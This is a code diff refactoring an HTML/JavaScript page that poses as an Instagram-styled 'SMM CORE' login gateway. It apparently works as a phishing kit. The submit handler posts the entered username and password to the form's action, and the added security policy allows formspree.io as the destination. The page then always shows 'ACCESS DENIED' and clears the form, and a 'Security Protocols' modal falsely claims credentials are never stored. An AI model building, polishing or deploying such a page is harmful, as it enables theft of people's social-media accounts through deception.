@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data:; connect-src 'self' https://formspree.io;">
+    
     <title>SMM CORE | Enterprise Gateway</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -18,7 +20,6 @@
         * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
         body { background: #010409; color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; overflow: hidden; }
 
-        /* --- 1. DYNAMIC BACKGROUND LAYER --- */
         #bg-canvas { position: fixed; inset: 0; z-index: -1; opacity: 0.5; }
         .vignette { position: fixed; inset: 0; background: radial-gradient(circle at center, transparent 0%, #010409 100%); pointer-events: none; }
         
@@ -28,7 +29,6 @@
         }
         @keyframes float-orb { from { transform: translate(0, 0); } to { transform: translate(100px, 100px); } }
 
-        /* --- 2. DECENT NOTIFICATION --- */
         #error-toast {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             background: rgba(15, 15, 15, 0.9); border: 1px solid var(--error-red);
@@ -41,7 +41,6 @@
         .error-icon { color: var(--error-red); font-size: 1.2rem; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-        /* --- 3. PREMIUM SIDEBAR --- */
         aside {
             width: 320px; background: rgba(2, 4, 8, 0.98); backdrop-filter: blur(40px);
             border-right: 1px solid var(--border); display: flex; flex-direction: column; 
@@ -50,27 +49,21 @@
         @keyframes slideInLeft { from { transform: translateX(-100%); } to { transform: translateX(0); } }
 
         .logo { font-family: 'Orbitron'; font-weight: 900; font-size: 1.6rem; color: var(--cyan); margin-bottom: 3rem; letter-spacing: 2px; }
-        
         .nav-label { font-size: 0.65rem; color: #475569; text-transform: uppercase; letter-spacing: 3px; margin: 2rem 0 1rem 0.5rem; font-weight: 700; }
         nav { overflow-y: auto; flex-grow: 1; }
-        nav::-webkit-scrollbar { width: 0px; }
-
         nav a { 
             color: #94a3b8; text-decoration: none; padding: 14px 1.2rem; border-radius: 14px;
             display: flex; align-items: center; gap: 16px; transition: 0.3s;
             margin-bottom: 6px; font-size: 0.9rem; border: 1px solid transparent;
+            cursor: pointer;
         }
         nav a:hover { background: rgba(255, 255, 255, 0.03); color: white; border-color: var(--border); transform: translateX(5px); }
         nav a.active { background: rgba(0, 242, 255, 0.05); color: var(--cyan); border-color: rgba(0, 242, 255, 0.2); }
 
-        /* --- 4. THE LOGIN BOX --- */
         main { flex-grow: 1; display: flex; align-items: center; justify-content: center; position: relative; animation: fadeIn 1.2s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
         .login-card {
             width: 440px; background: #0b0e16; border-radius: 32px; 
-            padding: 3rem 3.5rem;
-            position: relative; z-index: 10; border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 3rem 3.5rem; position: relative; z-index: 10; border: 1px solid rgba(255, 255, 255, 0.1);
             box-shadow: 0 40px 80px rgba(0,0,0,0.8);
         }
         .login-card::after {
@@ -83,9 +76,8 @@
         @keyframes gradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
         .ig-glyph { font-size: 3.2rem; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 15px; text-align: center; display: block; }
-
         .input-wrap { position: relative; margin-bottom: 1.2rem; }
-        .input-wrap i { position: absolute; left: 22px; top: 19px; color: #475569; transition: 0.3s; }
+        .input-wrap i { position: absolute; left: 22px; top: 19px; color: #475569; }
         
         input[type="text"], input[type="password"] {
             width: 100%; background: #06090f; border: 1px solid #1c2128;
@@ -93,39 +85,28 @@
             font-size: 1rem; outline: none; transition: 0.4s;
         }
         input:focus { border-color: #bc1888; background: #0a0e14; }
-        input:focus + i { color: #bc1888; }
 
         .policy-check { display: flex; align-items: flex-start; gap: 12px; margin: 1.2rem 0; cursor: pointer; font-size: 0.85rem; color: #64748b; line-height: 1.4; }
         .policy-check input { display: none; }
         .custom-box { min-width: 20px; height: 20px; border: 2px solid #1c2128; border-radius: 6px; position: relative; background: #06090f; }
         .policy-check input:checked + .custom-box { background: var(--ig-grad); border-color: transparent; }
         .policy-check input:checked + .custom-box::after { content: "\f00c"; font-family: "Font Awesome 6 Free"; font-weight: 900; position: absolute; color: white; font-size: 10px; left: 3px; top: 1px; }
-        .policy-link { color: var(--cyan); text-decoration: none; font-weight: 600; transition: 0.3s; }
-        .policy-link:hover { text-shadow: 0 0 8px var(--cyan); }
-
+        
         .btn-action {
             width: 100%; background: var(--ig-grad); color: white; border: none;
             border-radius: 18px; padding: 18px; font-weight: 800; font-family: 'Plus Jakarta Sans';
             cursor: pointer; text-transform: uppercase; letter-spacing: 2px;
             transition: 0.4s; margin-top: 5px; font-size: 0.95rem;
         }
-        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(220, 39, 67, 0.3); letter-spacing: 3px; }
 
-        /* --- MODAL SYSTEM --- */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 3000; display: none; align-items: center; justify-content: center; opacity: 0; transition: 0.4s; }
         .modal-overlay.active { display: flex; opacity: 1; }
-        .modal-card { width: 90%; max-width: 550px; background: #0b0e16; border: 1px solid var(--border); border-radius: 24px; padding: 2.5rem; position: relative; transform: scale(0.9); transition: 0.4s; box-shadow: 0 50px 100px rgba(0,0,0,0.8); }
-        .modal-overlay.active .modal-card { transform: scale(1); }
-        .close-modal { position: absolute; top: 20px; right: 20px; color: #475569; font-size: 1.5rem; cursor: pointer; transition: 0.3s; }
-        .close-modal:hover { color: white; }
-        .modal-card h3 { font-family: 'Orbitron'; color: var(--cyan); margin-bottom: 1.5rem; font-size: 1.2rem; }
-        .modal-card p { color: #94a3b8; font-size: 0.9rem; line-height: 1.6; margin-bottom: 1rem; }
+        .modal-card { width: 90%; max-width: 550px; background: #0b0e16; border: 1px solid var(--border); border-radius: 24px; padding: 2.5rem; position: relative; }
+        .close-modal { position: absolute; top: 20px; right: 20px; color: #475569; font-size: 1.5rem; cursor: pointer; }
 
-        /* --- HUD --- */
         .hud { position: absolute; left: 40px; bottom: 40px; font-family: 'Orbitron'; font-size: 0.6rem; color: #334155; line-height: 2; }
         .status-pill { display: flex; align-items: center; gap: 8px; color: #22c55e; margin-bottom: 5px; }
         .dot { width: 6px; height: 6px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; }
-
     </style>
 </head>
 <body>
@@ -144,20 +125,20 @@
 
     <aside>
         <div class="logo">SMM CORE</div>
-        <nav>
+        <nav id="sidebar-nav">
             <div class="nav-label">Main Hub</div>
             <a class="active"><i class="fas fa-chart-line"></i> Dashboard</a>
-            <a onclick="triggerError()"><i class="fas fa-plus-circle"></i> Place Order</a>
-            <a onclick="triggerError()"><i class="fas fa-list"></i> Services</a>
+            <a class="nav-trigger"><i class="fas fa-plus-circle"></i> Place Order</a>
+            <a class="nav-trigger"><i class="fas fa-list"></i> Services</a>
             
             <div class="nav-label">Management</div>
-            <a onclick="triggerError()"><i class="fas fa-history"></i> Order Logs</a>
-            <a onclick="triggerError()"><i class="fas fa-wallet"></i> Billing</a>
-            <a onclick="triggerError()"><i class="fas fa-ticket-alt"></i> Tickets</a>
+            <a class="nav-trigger"><i class="fas fa-history"></i> Order Logs</a>
+            <a class="nav-trigger"><i class="fas fa-wallet"></i> Billing</a>
+            <a class="nav-trigger"><i class="fas fa-ticket-alt"></i> Tickets</a>
 
             <div class="nav-label">Developer</div>
-            <a onclick="triggerError()"><i class="fas fa-code"></i> API Gateway</a>
-            <a onclick="triggerError()"><i class="fas fa-user-gear"></i> Account Settings</a>
+            <a class="nav-trigger"><i class="fas fa-code"></i> API Gateway</a>
+            <a class="nav-trigger"><i class="fas fa-user-gear"></i> Account Settings</a>
         </nav>
     </aside>
 
@@ -189,7 +170,7 @@
                 <label class="policy-check">
                     <input type="checkbox" id="policyCheckbox">
                     <div class="custom-box"></div>
-                    <span>I agree to the <a href="#" class="policy-link" onclick="openPolicy(event)">Privacy Policy</a> and Rules.</span>
+                    <span>I agree to the <a href="#" class="policy-link" id="openPolicyLink">Privacy Policy</a> and Rules.</span>
                 </label>
 
                 <button type="submit" class="btn-action" id="btnS">SECURE LOGIN</button>
@@ -203,108 +184,120 @@
 
     <div class="modal-overlay" id="policyModal">
         <div class="modal-card">
-            <i class="fas fa-times close-modal" onclick="closePolicy()"></i>
+            <i class="fas fa-times close-modal" id="closePolicyIcon"></i>
             <h3>Security Protocols</h3>
             <p><strong>1. Data Encryption:</strong> All credentials entered here are transmitted via secure TLS nodes and are never stored locally on our front-end servers.</p>
             <p><strong>2. Third-Party Terms:</strong> By clicking 'Secure Login', you acknowledge that this is a management portal and you comply with Instagram's Automated Interaction guidelines.</p>
-            <button class="btn-action" style="margin-top:20px;" onclick="closePolicy()">ACCEPT & CLOSE</button>
+            <button class="btn-action" style="margin-top:20px;" id="closePolicyBtn">ACCEPT & CLOSE</button>
         </div>
     </div>
 
     <script>
-        function openPolicy(e) {
-            e.preventDefault();
+        // Use DOMContentLoaded to ensure the elements exist before attaching listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            
             const modal = document.getElementById('policyModal');
-            modal.style.display = 'flex';
-            setTimeout(() => modal.classList.add('active'), 10);
-        }
-
-        function closePolicy() {
-            const modal = document.getElementById('policyModal');
-            modal.classList.remove('active');
-            setTimeout(() => modal.style.display = 'none', 400);
-        }
-
-        const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        let pts = [];
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        class Pt {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.s = Math.random() * 1.2;
-                this.vx = Math.random() * 0.4 - 0.2;
-                this.vy = Math.random() * 0.4 - 0.2;
-            }
-            upd() {
-                this.x += this.vx; this.y += this.vy;
-                if (this.x > canvas.width || this.x < 0) this.vx *= -1;
-                if (this.y > canvas.height || this.y < 0) this.vy *= -1;
-            }
-            drw() {
-                ctx.fillStyle = 'rgba(0, 242, 255, 0.3)';
-                ctx.beginPath(); ctx.arc(this.x, this.y, this.s, 0, Math.PI * 2); ctx.fill();
-            }
-        }
-        function init() { for(let i=0; i<100; i++) pts.push(new Pt()); }
-        function loop() {
-            ctx.clearRect(0,0,canvas.width, canvas.height);
-            pts.forEach(p => { p.upd(); p.drw(); });
-            requestAnimationFrame(loop);
-        }
-        init(); loop();
-
-        function triggerError(customMessage) {
             const toast = document.getElementById('error-toast');
             const msgSpan = document.getElementById('error-msg');
-            
-            if(customMessage) {
-                msgSpan.innerText = customMessage;
-            } else {
-                msgSpan.innerText = "AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE";
+
+            // --- 1. Event Listeners for Modal ---
+            document.getElementById('openPolicyLink').addEventListener('click', (e) => {
+                e.preventDefault();
+                modal.style.display = 'flex';
+                setTimeout(() => modal.classList.add('active'), 10);
+            });
+
+            const closeFunc = () => {
+                modal.classList.remove('active');
+                setTimeout(() => modal.style.display = 'none', 400);
+            };
+
+            document.getElementById('closePolicyIcon').addEventListener('click', closeFunc);
+            document.getElementById('closePolicyBtn').addEventListener('click', closeFunc);
+
+            // --- 2. Sidebar Trigger Logic ---
+            const triggerError = (customMessage) => {
+                msgSpan.innerText = customMessage || "AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE";
+                toast.classList.add('active');
+                setTimeout(() => toast.classList.remove('active'), 3500);
+            };
+
+            document.querySelectorAll('.nav-trigger').forEach(link => {
+                link.addEventListener('click', () => triggerError());
+            });
+
+            // --- 3. Form Submission ---
+            const form = document.getElementById('authForm');
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const isChecked = document.getElementById('policyCheckbox').checked;
+                if(!isChecked) {
+                    triggerError("PLEASE ACCEPT THE PRIVACY POLICY TO CONTINUE");
+                    return;
+                }
+
+                const b = document.getElementById('btnS');
+                const originalBg = b.style.background;
+                b.innerText = "AUTHENTICATING...";
+                b.style.pointerEvents = "none";
+                
+                try {
+                    const response = await fetch(form.action, {
+                        method: 'POST',
+                        body: new FormData(form),
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (response.ok) {
+                        b.innerText = "ACCESS DENIED";
+                        b.style.background = "var(--error-red)";
+                        form.reset();
+                    }
+                } catch (err) {
+                    b.innerText = "CONNECTION ERROR";
+                }
+
+                setTimeout(() => { 
+                    b.innerText = "SECURE LOGIN"; 
+                    b.style.background = originalBg;
+                    b.style.pointerEvents = "all";
+                }, 4000);
+            });
+
+            // --- 4. Background Animation ---
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            let pts = [];
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            class Pt {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = Math.random() * canvas.height;
+                    this.s = Math.random() * 1.2;
+                    this.vx = Math.random() * 0.4 - 0.2;
+                    this.vy = Math.random() * 0.4 - 0.2;
+                }
+                upd() {
+                    this.x += this.vx; this.y += this.vy;
+                    if (this.x > canvas.width || this.x < 0) this.vx *= -1;
+                    if (this.y > canvas.height || this.y < 0) this.vy *= -1;
+                }
+                drw() {
+                    ctx.fillStyle = 'rgba(0, 242, 255, 0.3)';
+                    ctx.beginPath(); ctx.arc(this.x, this.y, this.s, 0, Math.PI * 2); ctx.fill();
+                }
             }
-
-            toast.classList.add('active');
-            setTimeout(() => toast.classList.remove('active'), 3500);
-        }
-
-        const form = document.getElementById('authForm');
-        form.onsubmit = async (e) => {
-            e.preventDefault();
-            
-            const isChecked = document.getElementById('policyCheckbox').checked;
-            if(!isChecked) {
-                triggerError("PLEASE ACCEPT THE PRIVACY POLICY TO CONTINUE");
-                return;
-            }
-
-            const b = document.getElementById('btnS');
-            b.innerText = "AUTHENTICATING...";
-            b.style.pointerEvents = "none";
-            
-            try {
-                await fetch(form.action, {
-                    method: 'POST',
-                    body: new FormData(form),
-                    headers: { 'Accept': 'application/json' }
-                });
-
-                b.innerText = "ACCESS DENIED";
-                b.style.background = "var(--error-red)";
-                form.reset();
-            } catch (err) {
-                b.innerText = "ERROR";
-            }
-
-            setTimeout(() => { 
-                b.innerText = "SECURE LOGIN"; 
-                b.style.background = "var(--ig-grad)";
-                b.style.pointerEvents = "all";
-            }, 4000);
-        };
+            const init = () => { for(let i=0; i<100; i++) pts.push(new Pt()); };
+            const loop = () => {
+                ctx.clearRect(0,0,canvas.width, canvas.height);
+                pts.forEach(p => { p.upd(); p.drw(); });
+                requestAnimationFrame(loop);
+            };
+            init(); loop();
+        });
     </script>
 </body>
 </html>
